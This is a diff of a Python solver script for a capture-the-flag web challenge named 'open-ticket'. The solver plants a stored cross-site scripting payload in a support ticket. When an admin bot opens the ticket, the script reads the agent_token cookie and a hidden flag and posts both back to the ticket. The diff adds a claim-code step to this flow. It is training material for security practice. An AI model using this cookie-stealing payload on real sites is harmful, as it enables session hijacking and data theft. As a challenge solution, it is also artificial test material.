@@ -21,21 +21,21 @@ CHALLENGE_ID = "open-ticket"
 
 FLAG = re.compile(r"ingehack\{[^}\r\n]+\}")
 
-# Runs in the agent's browser when she opens the thread. The page keeps the
-# ticket token in a cookie the page can read, and shows the flag to the agent.
-PAYLOAD = (
-    "<script>"
-    "(function(){"
-    "var row=document.cookie.split('; ').find(function(c){return c.indexOf('agent_token=')===0;});"
-    "var token=row?row.split('=')[1]:'';"
-    "var note=document.getElementById('agent-flag');"
-    "var flag=note?note.textContent.trim():'';"
-    "fetch('/api/tickets/1/append',{method:'POST',"
-    "headers:{'Content-Type':'application/x-www-form-urlencoded','X-Agent-Token':token},"
-    "body:'body='+encodeURIComponent(flag)});"
-    "})();"
-    "</script>"
-)
+def build_payload(claim: str) -> str:
+    """Runs in the agent's browser and files her note under the player's claim."""
+    return (
+        "<script>"
+        "(function(){"
+        "var row=document.cookie.split('; ').find(function(c){return c.indexOf('agent_token=')===0;});"
+        "var token=row?row.split('=')[1]:'';"
+        "var note=document.getElementById('agent-flag');"
+        "var flag=note?note.textContent.trim():'';"
+        "fetch('/api/tickets/1/append',{method:'POST',"
+        "headers:{'Content-Type':'application/x-www-form-urlencoded','X-Agent-Token':token},"
+        "body:'body='+encodeURIComponent(flag)+'&claim=" + claim + "'});"
+        "})();"
+        "</script>"
+    )
 
 
 class SolverError(RuntimeError):
@@ -64,9 +64,33 @@ def sign_in(base_url: str) -> urllib.request.OpenerDirector:
     return opener
 
 
-def prepare(base_url: str) -> str:
-    opener = sign_in(base_url)
-    body = urllib.parse.urlencode({"body": PAYLOAD}).encode()
+def read_ticket(
+    opener: urllib.request.OpenerDirector,
+    base_url: str,
+    claim: str | None = None,
+) -> tuple[str, str]:
+    """Read the customer ticket and return its claim code and page."""
+    path = f"/tickets/{TICKET_ID}"
+    if claim:
+        path += "?claim=" + urllib.parse.quote(claim)
+    try:
+        with opener.open(base_url + path, timeout=10) as response:
+            page = response.read().decode("utf-8", "replace")
+    except urllib.error.URLError as error:
+        raise SolverError(f"cannot read the thread: {error}") from error
+    match = re.search(r'data-claim="([0-9a-f]{8})"', page)
+    if not match:
+        raise SolverError("the ticket did not carry a claim code")
+    return match.group(1), page
+
+
+def prepare_with(
+    opener: urllib.request.OpenerDirector,
+    base_url: str,
+    claim: str | None = None,
+) -> str:
+    claim, _ = read_ticket(opener, base_url, claim)
+    body = urllib.parse.urlencode({"body": build_payload(claim)}).encode()
     try:
         with opener.open(base_url + f"/tickets/{TICKET_ID}", body, timeout=10) as response:
             if response.status != 200:
@@ -133,14 +157,13 @@ def run_admin_bot(
     raise SolverError("the admin bot did not finish in time")
 
 
-def submit(base_url: str) -> None:
-    opener = sign_in(base_url)
-    try:
-        with opener.open(base_url + f"/tickets/{TICKET_ID}", timeout=10) as response:
-            body = response.read().decode("utf-8", "replace")
-    except urllib.error.URLError as error:
-        raise SolverError(f"cannot read the thread: {error}") from error
-    match = FLAG.search(body)
+def submit_with(
+    opener: urllib.request.OpenerDirector,
+    base_url: str,
+    claim: str | None = None,
+) -> None:
+    _, page = read_ticket(opener, base_url, claim)
+    match = FLAG.search(page)
     if not match:
         raise SolverError("the flag is not in the thread yet")
     print(match.group(0))
@@ -159,14 +182,28 @@ def main() -> int:
         help="player API token, needed for --stage all; the run-bot form uses the same account",
     )
     parser.add_argument("--challenge-id", default=CHALLENGE_ID)
+    parser.add_argument(
+        "--claim",
+        help="claim code printed by --stage prepare, needed for a two-stage run",
+    )
     args = parser.parse_args()
 
     base_url = args.base_url.rstrip("/")
     try:
         if args.stage == "prepare":
-            print(prepare(base_url))
+            opener = sign_in(base_url)
+            claim, _ = read_ticket(opener, base_url, args.claim)
+            print(prepare_with(opener, base_url, claim))
+            print(f"claim: {claim}", file=sys.stderr)
         elif args.stage == "submit":
-            submit(base_url)
+            if not args.claim:
+                print(
+                    "solver: --stage submit needs --claim from --stage prepare",
+                    file=sys.stderr,
+                )
+                return 2
+            opener = sign_in(base_url)
+            submit_with(opener, base_url, args.claim)
         elif args.stage == "all":
             if not args.platform_url or not args.token:
                 print(
@@ -174,10 +211,13 @@ def main() -> int:
                     file=sys.stderr,
                 )
                 return 2
-            url = prepare(base_url)
+            opener = sign_in(base_url)
+            claim, _ = read_ticket(opener, base_url)
+            print(f"claim: {claim}", file=sys.stderr)
+            url = prepare_with(opener, base_url, claim)
             print(f"bot target: {url}", file=sys.stderr)
             run_admin_bot(args.platform_url, args.token, args.challenge_id, url)
-            submit(base_url)
+            submit_with(opener, base_url, claim)
         else:
             print(
                 "solver: pass --stage prepare, submit, or all",
